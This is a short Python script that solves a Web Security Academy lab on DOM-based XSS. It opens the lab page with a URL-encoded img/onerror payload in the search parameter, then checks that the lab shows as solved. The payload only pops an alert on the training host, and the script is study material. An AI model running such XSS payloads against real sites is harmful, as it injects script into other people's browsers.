import requests
import argparse
import webbrowser as wb
from time import sleep

parser = argparse.ArgumentParser(description='Solves the following Lab: DOM XSS in innerHTML sink using source location.search')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

wb.open("https://" + lab.id + '.web-security-academy.net/?search=%3Cimg%20src=1%20onerror=alert(%22XSS%22)%3E')

sleep(5)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
